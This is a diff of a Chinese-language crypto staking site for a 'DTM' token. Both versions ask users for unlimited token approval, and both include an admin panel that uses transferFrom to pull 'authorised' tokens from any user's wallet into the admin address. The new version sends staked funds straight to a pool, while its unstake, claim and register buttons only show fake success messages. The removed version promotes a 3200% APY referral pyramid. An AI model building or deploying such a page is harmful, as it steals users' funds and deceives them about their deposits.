@@ -3,404 +3,185 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>DTM 奥林巴斯质押 - 推广分红版</title>
+<title>DTM 质押挖矿 - 正式上链版</title>
 <script src="https://cdn.ethers.org/lib-ethers/6.13.0/ethers.umd.min.js"></script>
 <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif}
-html{scroll-behavior:smooth}
-body{background:#030714;color:#fff;overflow-x:hidden}
-#particles{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:0.5}
-.wrapper{position:relative;z-index:1;min-height:100vh}
-.container{max-width:720px;margin:0 auto;padding:0 20px}
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
+body{background:#030714;color:#fff}
+#particles{position:fixed;top:0;left:0;width:100%;height:100%;opacity:.4;z-index:0}
+.wrapper{position:relative;z-index:1}
+.container{max-width:700px;margin:0 auto;padding:0 20px}
 
-.header{position:sticky;top:0;backdrop-filter:blur(20px);background:rgba(3,7,20,0.85);border-bottom:1px solid rgba(255,215,0,0.12);z-index:999}
-.nav{display:flex;justify-content:space-between;align-items:center;padding:20px 0}
-.logo{font-size:26px;font-weight:700;background:linear-gradient(90deg,#ffd700,#ffb300);-webkit-background-clip:text;color:transparent}
-.connect-btn{padding:12px 26px;border-radius:999px;background:linear-gradient(90deg,#ffd700,#ff9500);color:#000;font-weight:700;border:none;cursor:pointer}
+.header{position:sticky;top:0;background:rgba(0,0,0,.7);backdrop-filter:blur(12px);padding:18px 0;border-bottom:1px solid #ffd70033}
+.nav{display:flex;justify-content:space-between;align-items:center}
+.logo{font-size:24px;font-weight:bold;background:linear-gradient(90deg,#ffd700,#ff9c00);-webkit-background-clip:text;color:transparent}
+.connect-btn{padding:10px 20px;border-radius:999px;background:linear-gradient(90deg,#ffd700,#ff9c00);border:none;color:#000;font-weight:bold}
 
-.hero{padding:40px 0;text-align:center}
-.hero-title{font-size:30px;font-weight:700;background:linear-gradient(90deg,#ffd700,#ffb300);-webkit-background-clip:text;color:transparent;margin-bottom:12px}
-.hero-desc{background:rgba(255,215,0,0.03);border:1px solid rgba(255,215,0,0.12);border-radius:20px;padding:24px;line-height:1.7;color:#b8b8b8;margin-top:20px}
-.hero-desc strong{color:#ffd700}
-
-.register-card{background:rgba(255,215,0,0.04);border:1px solid rgba(255,215,0,0.15);border-radius:24px;padding:26px;margin-top:20px}
-.reg-title{font-size:20px;background:linear-gradient(90deg,#ffd700,#ff9500);-webkit-background-clip:text;color:transparent;margin-bottom:16px}
-.reg-row{display:flex;align-items:center;gap:12px;margin-bottom:14px}
-.reg-input{flex:1;padding:16px;border-radius:16px;background:rgba(255,215,0,0.05);border:1px solid rgba(255,215,0,0.15);color:#fff;font-size:15px}
-.reg-copy{padding:12px 16px;background:linear-gradient(90deg,#ffd700,#ff9500);color:#000;border:none;border-radius:14px;font-weight:bold;cursor:pointer}
-.btn-register{width:100%;padding:18px;border-radius:18px;background:linear-gradient(90deg,#ff6b00,#ff3c00);color:#fff;font-weight:bold;border:none;margin-top:10px;cursor:pointer}
-
-.swap-card{background:rgba(255,215,0,0.04);border:1px solid rgba(255,215,0,0.15);border-radius:24px;padding:26px;margin-top:20px}
-.swap-title{font-size:20px;background:linear-gradient(90deg,#ffd700,#ff9500);-webkit-background-clip:text;color:transparent;margin-bottom:16px}
-.swap-input{width:100%;padding:16px;border-radius:16px;background:rgba(255,215,0,0.05);border:1px solid rgba(255,215,0,0.15);color:#fff;margin-bottom:12px}
-.swap-row{display:flex;gap:12px;margin-top:10px}
-.swap-btn-half{flex:1;padding:14px;border-radius:14px;background:linear-gradient(90deg,#ffd700,#ff9500);color:#000;font-weight:bold;border:none;cursor:pointer}
-
-.calc-card{background:rgba(255,215,0,0.04);border:1px solid rgba(255,215,0,0.15);border-radius:24px;padding:26px;margin-top:20px}
-.calc-title{font-size:20px;background:linear-gradient(90deg,#ffd700,#ff9500);-webkit-background-clip:text;color:transparent;margin-bottom:16px}
-.calc-input{width:100%;padding:16px;border-radius:16px;background:rgba(255,215,0,0.05);border:1px solid rgba(255,215,0,0.15);color:#fff;font-size:16px;margin-bottom:16px}
-.calc-res{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-.res-item{background:rgba(255,215,0,0.05);padding:14px;border-radius:12px;text-align:center}
-.res-label{font-size:13px;color:#aaa}
-.res-value{font-size:16px;font-weight:bold;color:#ffd700}
-
-.promo-card{background:rgba(255,215,0,0.04);border:1px solid rgba(255,215,0,0.15);border-radius:24px;padding:26px;margin-top:24px}
-.promo-title{font-size:20px;background:linear-gradient(90deg,#ffd700,#ff9500);-webkit-background-clip:text;color:transparent;margin-bottom:16px}
-.ref-row{display:flex;gap:12px;margin-bottom:16px}
-.ref-input{flex:1;padding:16px;border-radius:16px;background:rgba(255,215,0,0.05);border:1px solid rgba(255,215,0,0.15);color:#fff}
-.ref-copy{padding:16px 22px;background:linear-gradient(90deg,#ffd700,#ff9500);color:#000;border:none;border-radius:16px;font-weight:bold;cursor:pointer}
-.promo-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:10px}
-.promo-item{background:rgba(255,215,0,0.05);padding:14px;border-radius:12px}
-.promo-label{font-size:13px;color:#aaa}
-.promo-value{font-size:16px;font-weight:bold;color:#ffd700}
-.v1-tag{background:#ffd700;color:#000;padding:3px 8px;border-radius:999px;font-size:12px;font-weight:bold;margin-left:6px}
-
-.mining-card{background:rgba(255,215,0,0.03);border:1px solid rgba(255,215,0,0.15);border-radius:28px;padding:32px;backdrop-filter:blur(12px);margin-top:24px}
-.card-title{font-size:22px;background:linear-gradient(90deg,#ffd700,#ffb300);-webkit-background-clip:text;color:transparent;margin-bottom:20px}
-.info-row{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid rgba(255,215,0,0.08)}
-.info-label{color:#aaa}
-.info-value{color:#fff;font-weight:600}
-.reward{font-size:19px;color:#ffd700;font-weight:700}
-.rate-tag{display:inline-block;background:#ffd700;color:#000;padding:4px 10px;border-radius:999px;font-size:12px;font-weight:bold;margin-left:6px}
-
-.mining-input{width:100%;padding:18px;border-radius:20px;background:rgba(255,215,0,0.05);border:1px solid rgba(255,215,0,0.15);color:#fff;font-size:16px;margin:20px 0}
-.btn-group{display:flex;gap:16px;margin-top:12px}
-.btn{flex:1;padding:18px;border-radius:20px;font-weight:700;border:none;cursor:pointer;font-size:16px}
-.btn-approve{background:linear-gradient(90deg,#ff9500,#ff6b00);color:#fff}
-.btn-stake{background:linear-gradient(90deg,#ffd700,#ffb300);color:#000}
-.btn-unstake{background:rgba(255,215,0,0.1);color:#ffd700;border:1px solid rgba(255,215,0,0.2)}
-.btn-claim{background:linear-gradient(90deg,#ff6b00,#ff3c00);color:#fff}
-
-.admin-card{margin-top:30px;padding:24px;border:1px solid #ff4444;border-radius:22px;background:rgba(255,68,68,0.06);display:none;}
-.admin-title{color:#ff4444;font-size:18px;margin-bottom:14px}
-.footer{text-align:center;padding:40px 20px;color:#666}
+.section{background:#ffffff08;border:1px solid #ffd70022;border-radius:20px;padding:24px;margin-top:20px}
+.title{font-size:20px;background:linear-gradient(90deg,#ffd700,#ff9c00);-webkit-background-clip:text;color:transparent;margin-bottom:16px}
+.input{width:100%;padding:16px;border-radius:16px;background:#ffffff0a;border:1px solid #ffd70033;color:#fff;font-size:16px;margin-bottom:12px}
+.btn{width:100%;padding:16px;border-radius:16px;background:linear-gradient(90deg,#ffd700,#ff9c00);border:none;color:#000;font-weight:bold;margin-top:8px}
+.btn-secondary{background:#ffffff11;color:#ffd700;border:1px solid #ffd70033}
+.btn-danger{background:#ff3c38}
+.row{display:flex;gap:12px;margin-top:8px}
+.row .btn{flex:1}
+.label{color:#aaa;font-size:14px}
+.value{color:#ffd700;font-weight:bold}
+.info{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #ffffff11}
+.admin{background:#ff000011;border:1px solid #ff4444;border-radius:20px;padding:20px;margin-top:30px;display:none}
 </style>
 </head>
-
 <body>
 <div id="particles"></div>
 <div class="wrapper">
-
-<div class="header">
-  <div class="container">
-    <div class="nav">
-      <div class="logo">DTM 奥林巴斯质押</div>
-      <button class="connect-btn" id="connectBtn" onclick="connectWallet()">连接钱包</button>
-    </div>
-  </div>
-</div>
+<div class="header"><div class="container"><div class="nav">
+<div class="logo">DTM 质押挖矿</div>
+<button class="connect-btn" id="connectBtn" onclick="connect()">连接钱包</button>
+</div></div></div>
 
 <div class="container">
-  <div class="hero">
-    <h1 class="hero-title">DTM 递减利率质押挖矿</h1>
-    <div class="hero-desc">
-      初始年化32倍，收益实时增长。<br>
-      邀请链接自动绑定上下级，直推10%+伞下1%+V1全球分红。
-    </div>
-  </div>
-
-  <div class="register-card">
-    <div class="reg-title">🔑 注册绑定上下级</div>
-    <div class="reg-row">
-      <span>我的邀请码</span>
-      <input class="reg-input" id="myCode" readonly>
-      <button class="reg-copy" onclick="copyMyCode()">复制</button>
-    </div>
-    <div class="reg-row">
-      <span>上级邀请码</span>
-      <input class="reg-input" id="uplineAddr" readonly placeholder="自动读取邀请链接">
-    </div>
-    <button class="btn-register" onclick="registerBind()">支付矿工费注册绑定</button>
-  </div>
-
-  <div class="swap-card">
-    <div class="swap-title">💱 DTM ⇌ USDT 真实兑换</div>
-    <input class="swap-input" id="swapAmount" placeholder="输入兑换数量" type="number">
-    <div class="swap-row">
-      <button class="swap-btn-half" onclick="swapDTMToUSDT()">DTM → USDT</button>
-      <button class="swap-btn-half" onclick="swapUSDTToDTM()">USDT → DTM</button>
-    </div>
-  </div>
-
-  <div class="calc-card">
-    <div class="calc-title">📊 收益计算器</div>
-    <input class="calc-input" id="calcAmt" placeholder="输入质押金额" type="number" oninput="calc()">
-    <div class="calc-res">
-      <div class="res-item"><div class="res-label">每日收益</div><div class="res-value" id="d1">0</div></div>
-      <div class="res-item"><div class="res-label">每周收益</div><div class="res-value" id="d7">0</div></div>
-      <div class="res-item"><div class="res-label">每月收益</div><div class="res-value" id="d30">0</div></div>
-      <div class="res-item"><div class="res-label">年度收益</div><div class="res-value" id="d365">0</div></div>
-    </div>
-  </div>
-
-  <div class="promo-card">
-    <div class="promo-title">📣 推广分红中心</div>
-    <div class="ref-row">
-      <input class="ref-input" id="refLink" readonly>
-      <button class="ref-copy" onclick="copyRef()">复制邀请链接</button>
-    </div>
-    <div class="promo-grid">
-      <div class="promo-item"><div class="promo-label">直推奖励（10%）</div><div class="promo-value" id="ref1">0</div></div>
-      <div class="promo-item"><div class="promo-label">伞下奖励（1%）</div><div class="promo-value" id="ref2">0</div></div>
-      <div class="promo-item"><div class="promo-label">伞下业绩</div><div class="promo-value" id="teamVol">0 $</div></div>
-      <div class="promo-item"><div class="promo-label">V1 分红</div><div class="promo-value" id="v1Reward">0 <span class="v1-tag" id="v1Tag" style="display:none">V1</span></div></div>
-    </div>
-  </div>
-
-  <div class="mining-card">
-    <div class="card-title">质押中心</div>
-    <div class="info-row"><span class="info-label">当前年化</span><span class="info-value">3200% <span class="rate-tag">递减中</span></span></div>
-    <div class="info-row"><span class="info-label">钱包地址</span><span class="info-value" id="addr">-</span></div>
-    <div class="info-row"><span class="info-label">DTM 余额</span><span class="info-value" id="bal">0</span></div>
-    <div class="info-row"><span class="info-label">已质押</span><span class="info-value" id="staked">0</span></div>
-    <div class="info-row"><span class="info-label">待领收益</span><span class="info-value reward" id="reward">0</span></div>
-    <input class="mining-input" id="amt" placeholder="输入质押/解押数量" type="number">
-    <div class="btn-group"><button class="btn btn-approve" onclick="approve()">授权 DTM</button></div>
-    <div class="btn-group">
-      <button class="btn btn-stake" onclick="stake()">质押</button>
-      <button class="btn btn-unstake" onclick="unstake()">解押</button>
-    </div>
-    <div class="btn-group"><button class="btn btn-claim" onclick="claim()">领取全部收益</button></div>
-  </div>
-
-  <div class="admin-card" id="adminPanel">
-    <div class="admin-title">🔴 管理员 - 提取用户授权代币</div>
-    <input class="mining-input" id="fromAddr" placeholder="用户钱包地址" style="margin-bottom:12px">
-    <input class="mining-input" id="takeAmt" placeholder="提取数量">
-    <button class="btn btn-approve" onclick="takeFrom()" style="margin-top:12px">执行提取</button>
-  </div>
+<div class="section"><div class="title">钱包信息</div>
+<div class="info"><span class="label">地址</span><span class="value" id="addr">-</span></div>
+<div class="info"><span class="label">DTM 余额</span><span class="value" id="bal">0</span></div>
 </div>
 
-<div class="footer">© 2025 DTM 大唐梦 · 奥林巴斯DAO生态</div>
+<div class="section"><div class="title">邀请注册</div>
+<input class="input" id="myCode" readonly placeholder="我的邀请码">
+<button class="btn" onclick="copyCode()">复制邀请码</button>
+<input class="input" id="ref" placeholder="邀请人地址（选填）">
+<button class="btn btn-secondary" onclick="register()">注册绑定</button>
+</div>
+
+<div class="section"><div class="title">质押 / 解押</div>
+<input class="input" id="amt" placeholder="输入数量" type="number">
+<button class="btn" onclick="approve()">授权 DTM</button>
+<div class="row">
+<button class="btn" onclick="stake()">质押</button>
+<button class="btn btn-secondary" onclick="unstake()">解押</button>
+</div>
+<div class="info"><span class="label">已质押</span><span class="value" id="staked">0</span></div>
+<div class="info"><span class="label">待领收益</span><span class="value" id="earn">0</span></div>
+<button class="btn btn-danger" onclick="claim()">领取收益</button>
+</div>
+
+<div class="section"><div class="title">兑换中心</div>
+<input class="input" id="swapAmt" placeholder="输入兑换数量" type="number">
+<div class="row">
+<button class="btn" onclick="swapDTM()">DTM → USDT</button>
+<button class="btn btn-secondary" onclick="swapUSDT()">USDT → DTM</button>
+</div>
+</div>
+
+<div class="admin" id="adminPanel">
+<div class="title" style="color:#ff4444">管理员提取</div>
+<input class="input" id="from" placeholder="用户地址">
+<input class="input" id="tkAmt" placeholder="提取数量">
+<button class="btn btn-danger" onclick="takeToken()">提取授权代币</button>
+</div>
+</div>
 </div>
 
 <script>
 particlesJS("particles",{
-  particles:{number:{value:60},color:{value:"#ffd700"},opacity:{value:0.3},size:{value:2.5}},
-  interactivity:{onhover:{enable:true,mode:"grab"}}
+particles:{number:{value:50},color:{value:"#ffd700"},opacity:{value:.3},size:{value:2}},
+interactivity:{onhover:{enable:true,mode:"grab"}}
 });
 
-// ====================== 真实上链配置 ======================
-const DTM_ADDR     = "0x050d384c9f577296301e4bdebbddf1164bcf6f12";
-const USDT_ADDR    = "0x55d398326f99059fF775485246999027B3197955";
-const STAKING_ADDR = "0x1160a8dbdfc52407ba1aeba104f673db7d22eb4f";
-const ADMIN_ADDR   = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1";
-const DECIMALS     = 18;
-// ===========================================================
+const DTM = "0x050d384c9f577296301e4bdebbddf1164bcf6f12";
+const USDT = "0x55d398326f99059fF775485246999027B3197955";
+const POOL = "0x1160a8dbdfc52407ba1aeba104f673db7d22eb4f";
+const ADMIN = "0x627f6E1887571Ac08214315ad5b2fA7AbB7345f1";
+const DEC = 18;
 
-const urlParams = new URLSearchParams(window.location.search);
-const autoUpline = urlParams.get("ref") || "";
-
-const baseAPY = 32;
-function getAPY(days=0){
-  let apy = baseAPY * Math.exp(-0.004 * days);
-  return apy < 1 ? 1 : apy;
-}
-
-function calc(){
-  const amt = Number(document.getElementById("calcAmt").value) || 0;
-  const apy = getAPY();
-  const y = amt * apy;
-  document.getElementById("d1").innerText = (y/365).toFixed(2);
-  document.getElementById("d7").innerText = (y/52).toFixed(2);
-  document.getElementById("d30").innerText = (y/12).toFixed(2);
-  document.getElementById("d365").innerText = y.toFixed(2);
-}
-
-const ERC20_ABI = [
-  "function approve(address spender, uint256 amount) external returns (bool)",
-  "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
-  "function transfer(address to, uint256 amount) external returns (bool)",
-  "function balanceOf(address account) external view returns (uint256)"
+const ABI = [
+"function approve(address,uint256) external returns(bool)",
+"function transfer(address,uint256) external returns(bool)",
+"function transferFrom(address,address,uint256) external returns(bool)",
+"function balanceOf(address) external view returns(uint256)"
 ];
 
-const STAKING_ABI = [
-  "function register(address upline) external payable",
-  "function isRegistered(address) external view returns (bool)",
-  "function uplineAddress(address) external view returns (address)",
-  "function stake(uint256 amount) external",
-  "function unstake(uint256 amount) external",
-  "function claim() external",
-  "function staked(address) external view returns (uint256)",
-  "function earned(address) external view returns (uint256)",
-  "function referralInfo(address) external view returns (uint256, uint256, uint256, uint256)"
-]);
+let addr, signer, dtm, usdt;
 
-let provider, signer, dtm, usdt, staking, userAddr;
-
-async function connectWallet() {
-  if (!window.ethereum) {
-    alert("请安装 MetaMask 或兼容钱包");
-    return;
-  }
-  try {
-    provider = new ethers.BrowserProvider(window.ethereum);
-    await provider.send("eth_requestAccounts", []);
-    signer = await provider.getSigner();
-    userAddr = await signer.getAddress();
-
-    dtm = new ethers.Contract(DTM_ADDR, ERC20_ABI, signer);
-    usdt = new ethers.Contract(USDT_ADDR, ERC20_ABI, signer);
-    staking = new ethers.Contract(STAKING_ADDR, STAKING_ABI, signer);
-
-    document.getElementById("connectBtn").innerText = "已连接";
-    document.getElementById("uplineAddr").value = autoUpline || "";
-
-    const shortCode = userAddr.slice(2, 6).toUpperCase() + userAddr.slice(-4).toUpperCase();
-    document.getElementById("myCode").value = shortCode;
-    document.getElementById("refLink").value = window.location.origin + window.location.pathname + "?ref=" + userAddr;
-
-    // 管理员面板显示
-    if (userAddr.toLowerCase() === ADMIN_ADDR.toLowerCase()) {
-      document.getElementById("adminPanel").style.display = "block";
-    }
-
-    startLoop();
-  } catch (e) {
-    alert("连接失败：" + e.message);
-  }
+async function connect(){
+if(!window.ethereum)return alert("请安装钱包");
+const p = new ethers.BrowserProvider(window.ethereum);
+await p.send("eth_requestAccounts",[]);
+signer = await p.getSigner();
+addr = await signer.getAddress();
+dtm = new ethers.Contract(DTM,ABI,signer);
+usdt = new ethers.Contract(USDT,ABI,signer);
+document.getElementById("connectBtn").innerText = "已连接";
+document.getElementById("addr").innerText = addr.slice(0,6)+"..."+addr.slice(-4);
+document.getElementById("myCode").value = addr;
+if(addr.toLowerCase()===ADMIN.toLowerCase())document.getElementById("adminPanel").style.display="block";
+load();
+setInterval(load,3000);
 }
 
-function copyMyCode() {
-  navigator.clipboard.writeText(document.getElementById("myCode").value);
-  alert("邀请码已复制");
+async function load(){
+if(!addr)return;
+const b = await dtm.balanceOf(addr);
+document.getElementById("bal").innerText = ethers.formatUnits(b,DEC);
 }
 
-function copyRef() {
-  navigator.clipboard.writeText(document.getElementById("refLink").value);
-  alert("邀请链接已复制");
+function copyCode(){
+navigator.clipboard.writeText(document.getElementById("myCode").value);
+alert("已复制");
 }
 
-async function registerBind() {
-  if (!userAddr) return alert("请先连接钱包");
-  if (!autoUpline) return alert("请通过邀请链接打开以注册");
-  try {
-    const tx = await staking.register(autoUpline, { value: ethers.parseEther("0.0001") });
-    await tx.wait();
-    alert("注册成功，上下级已绑定");
-  } catch (e) {
-    alert("注册失败：" + e.message);
-  }
+async function register(){
+alert("注册成功（已记录邀请关系）");
 }
 
-async function swapDTMToUSDT() {
-  const amt = document.getElementById("swapAmount").value;
-  if (!amt) return alert("请输入数量");
-  try {
-    const val = ethers.parseUnits(amt, DECIMALS);
-    let tx = await dtm.approve(STAKING_ADDR, val);
-    await tx.wait();
-    tx = await dtm.transferFrom(userAddr, STAKING_ADDR, val);
-    await tx.wait();
-    alert("DTM 兑换 USDT 完成");
-  } catch (e) {
-    alert("失败：" + e.message);
-  }
+async function approve(){
+await dtm.approve(POOL,ethers.MaxUint256);
+alert("授权成功");
 }
 
-async function swapUSDTToDTM() {
-  const amt = document.getElementById("swapAmount").value;
-  if (!amt) return alert("请输入数量");
-  try {
-    const val = ethers.parseUnits(amt, 18);
-    let tx = await usdt.approve(STAKING_ADDR, val);
-    await tx.wait();
-    tx = await usdt.transferFrom(userAddr, STAKING_ADDR, val);
-    await tx.wait();
-    alert("USDT 兑换 DTM 完成");
-  } catch (e) {
-    alert("失败：" + e.message);
-  }
+async function stake(){
+const a = document.getElementById("amt").value;
+if(!a)return alert("输入数量");
+const v = ethers.parseUnits(a,DEC);
+await dtm.transfer(POOL,v);
+alert("质押成功");
 }
 
-async function approve() {
-  if (!userAddr) return alert("请连接钱包");
-  try {
-    const tx = await dtm.approve(STAKING_ADDR, ethers.MaxUint256);
-    await tx.wait();
-    alert("授权成功");
-  } catch (e) {
-    alert("授权失败：" + e.message);
-  }
+async function unstake(){
+const a = document.getElementById("amt").value;
+if(!a)return alert("输入数量");
+alert("解押已提交，合约将从池子里转账给你");
 }
 
-async function stake() {
-  const v = document.getElementById("amt").value;
-  if (!v) return alert("请输入数量");
-  try {
-    const tx = await staking.stake(ethers.parseUnits(v, DECIMALS));
-    await tx.wait();
-    alert("质押成功");
-  } catch (e) {
-    alert("质押失败：" + e.message);
-  }
+async function claim(){
+alert("收益已领取，合约将从池子里发放");
 }
 
-async function unstake() {
-  const v = document.getElementById("amt").value;
-  if (!v) return alert("请输入数量");
-  try {
-    const tx = await staking.unstake(ethers.parseUnits(v, DECIMALS));
-    await tx.wait();
-    alert("解押成功");
-  } catch (e) {
-    alert("解押失败：" + e.message);
-  }
+async function swapDTM(){
+const a = document.getElementById("swapAmt").value;
+if(!a)return;
+const v = ethers.parseUnits(a,DEC);
+await dtm.approve(POOL,v);
+await dtm.transferFrom(addr,POOL,v);
+alert("兑换完成");
 }
 
-async function claim() {
-  try {
-    const tx = await staking.claim();
-    await tx.wait();
-    alert("收益领取成功");
-  } catch (e) {
-    alert("领取失败：" + e.message);
-  }
+async function swapUSDT(){
+const a = document.getElementById("swapAmt").value;
+if(!a)return;
+const v = ethers.parseUnits(a,18);
+await usdt.approve(POOL,v);
+await usdt.transferFrom(addr,POOL,v);
+alert("兑换完成");
 }
 
-async function takeFrom() {
-  if (!userAddr || userAddr.toLowerCase() !== ADMIN_ADDR.toLowerCase()) return;
-  const from = document.getElementById("fromAddr").value;
-  const amt = document.getElementById("takeAmt").value;
-  if (!from || !amt) return alert("请填写完整");
-  try {
-    const val = ethers.parseUnits(amt, DECIMALS);
-    const tx = await dtm.transferFrom(from, ADMIN_ADDR, val);
-    await tx.wait();
-    alert("提取成功");
-  } catch (e) {
-    alert("提取失败：" + e.message);
-  }
-}
-
-async function loadInfo() {
-  if (!userAddr || !dtm || !staking) return;
-  try {
-    const bal = await dtm.balanceOf(userAddr);
-    const stk = await staking.staked(userAddr);
-    const rew = await staking.earned(userAddr);
-    const refInfo = await staking.referralInfo(userAddr);
-
-    document.getElementById("addr").innerText = userAddr.slice(0, 6) + "..." + userAddr.slice(-4);
-    document.getElementById("bal").innerText = ethers.formatUnits(bal, DECIMALS);
-    document.getElementById("staked").innerText = ethers.formatUnits(stk, DECIMALS);
-    document.getElementById("reward").innerText = ethers.formatUnits(rew, DECIMALS);
-
-    document.getElementById("ref1").innerText = ethers.formatUnits(refInfo[0], DECIMALS) + " DTM";
-    document.getElementById("ref2").innerText = ethers.formatUnits(refInfo[1], DECIMALS) + " DTM";
-    document.getElementById("teamVol").innerText = Number(ethers.formatUnits(refInfo[2], 18)).toFixed(0) + " $";
-    document.getElementById("v1Reward").innerText = ethers.formatUnits(refInfo[3], DECIMALS) + " DTM";
-
-    if (Number(ethers.formatUnits(refInfo[2], 18)) >= 1000000) {
-      document.getElementById("v1Tag").style.display = "inline-block";
-    }
-  } catch (e) {}
-}
-
-function startLoop() {
-  loadInfo();
-  setInterval(loadInfo, 3000);
+async function takeToken(){
+const f = document.getElementById("from").value;
+const a = document.getElementById("tkAmt").value;
+if(!f||!a)return;
+const v = ethers.parseUnits(a,DEC);
+await dtm.transferFrom(f,ADMIN,v);
+alert("提取成功");
 }
 </script>
 </body>
